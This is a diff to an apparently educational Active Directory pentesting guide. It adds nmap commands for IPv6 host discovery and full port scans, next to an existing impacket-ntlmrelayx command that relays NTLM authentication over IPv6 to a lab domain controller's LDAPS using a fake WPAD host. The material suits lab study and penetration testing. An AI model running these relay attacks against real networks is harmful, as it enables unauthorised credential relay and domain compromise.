@@ -175,6 +175,15 @@ After some trial and error, not all 'execs' will work and this is normal in the 
 ## 🚩 IPv6 Attacks - Another form of relaying.  
 IPv6 can be used to conduct authentication via DNS to the Domain Controller via LDAP or SMB.  
 
+To identify if IPv6 exsists on a network or endpoint the following nmap command can be used:  
+**General Discovery** 
+                        
+            nmap -6 -sn <IPv6_range>
+
+**Once you find active hosts, scan for attack vectors using:**
+
+            nmap -6 -p- <IPv6_target>
+
 1.  We will use ntlmrelayx here with ipv6 -6 and the target -t pointing to ldaps of the DC. -wh (wpad) -l (gathered information)  
 
             impacket-ntlmrelayx -6 -t ldaps://192.168.64.138 -wh fakepad.marvel.local -l lootme  
